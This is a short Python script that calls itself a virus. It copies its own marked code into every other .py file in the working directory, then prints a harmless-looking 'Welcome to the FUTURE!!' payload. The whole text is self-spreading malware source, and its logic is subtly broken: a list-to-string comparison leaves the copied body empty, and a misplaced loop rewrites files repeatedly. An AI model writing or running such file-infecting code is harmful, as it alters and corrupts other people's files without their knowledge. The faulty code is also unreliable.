# start of virus #
import sys,glob
code =[]
with open(sys.argv[0],'r') as f:
    lines = f.readlines()
    
virus_area = False
for line in lines:
    if lines == "# start of virus #\n":
        virus_area = True
    if virus_area:
        code.append(line)
    if line == "# End of virus #":
        break
    
python_files = glob.glob('*.py')
print("Files are: ", python_files)
for files in python_files:
    with open(files,'r') as f:
        script_code = f.readlines()
    infected = False
    for line in script_code:
        if line == "# start of virus #\n":
            infected = True
            break
        if not infected:
            final_code = []
            final_code.extend(code)
            final_code.extend('\n')
            final_code.extend(script_code)
            with open(files, 'w') as f:
                f.writelines(final_code)
#payload
print("Welcome to the FUTURE!!")               
                       
# End of virus #